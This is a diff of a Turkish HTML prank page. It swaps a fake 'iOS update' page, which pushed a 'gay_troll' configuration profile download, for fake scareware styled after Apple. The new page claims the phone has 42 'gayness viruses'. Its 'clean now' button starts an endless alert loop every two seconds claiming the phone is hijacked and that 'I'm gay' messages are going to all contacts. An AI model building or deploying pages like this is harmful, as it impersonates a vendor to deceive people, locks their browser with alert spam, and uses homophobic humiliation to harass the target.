@@ -2,26 +2,37 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iOS System Update</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>iOS Kritik Güvenlik Uyarısı</title>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; text-align: center; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .update-box { width: 80%; background: #1c1c1e; padding: 30px; border-radius: 20px; border: 1px solid #333; }
-        .apple-logo { font-size: 50px; margin-bottom: 20px; }
-        h1 { font-size: 20px; margin-bottom: 10px; }
-        p { font-size: 13px; color: #8e8e93; margin-bottom: 30px; }
-        .install-btn { background: #007aff; color: white; padding: 15px 40px; border-radius: 10px; text-decoration: none; font-weight: bold; display: inline-block; }
+        body { background: #000; color: #ff3b30; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .alert-box { border: 2px solid #ff3b30; padding: 40px; border-radius: 20px; background: rgba(255,0,0,0.1); }
+        h1 { font-size: 24px; }
+        .btn-fix { background: #ff3b30; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none; font-weight: bold; cursor: pointer; border: none; }
     </style>
 </head>
 <body>
 
-<div class="update-box">
-    <div class="apple-logo"></div>
-    <h1>iOS 19.4.1 Güncellemesi</h1>
-    <p>Güvenlik açıklarını kapatmak ve performans iyileştirmeleri için bu profili yüklemeniz gerekmektedir.</p>
-    
-    <a href="https://raw.githubusercontent.com/troll-profilleri/ana-dosya/main/gay_troll.mobileconfig" class="install-btn">ŞİMDİ YÜKLE</a>
+<div class="alert-box">
+    <h1>⚠️ VİRÜS TESPİT EDİLDİ</h1>
+    <p>Cihazınızda 42 adet 'Gaylık' virüsü bulundu. Temizlemek için hemen basın.</p>
+    <button class="btn-fix" onclick="baslatTroll()">ŞİMDİ TEMİZLE</button>
 </div>
+
+<script>
+function baslatTroll() {
+    // İlk uyarıyı veriyoruz
+    alert("Temizleme başarısız! Sistem ele geçirildi.");
+    
+    // İşte burası 10 saniyede bir (hatta daha hızlı) bildirim yağdıran kısım
+    setInterval(function() {
+        alert("HAHAHA HADİ SİL LAN!");
+        alert("SİLEMEZSİN Kİİİ!");
+        alert("TELEFONUN ARTIK BENİM!");
+        alert("ŞU AN TÜM REHBERİNE 'BEN GAYIM' MESAJI GİDİYOR...");
+    }, 2000); // 2000 ms = 2 saniyede bir bu 4 mesajı döner. Arkadaşın kafayı yer.
+}
+</script>
 
 </body>
 </html>
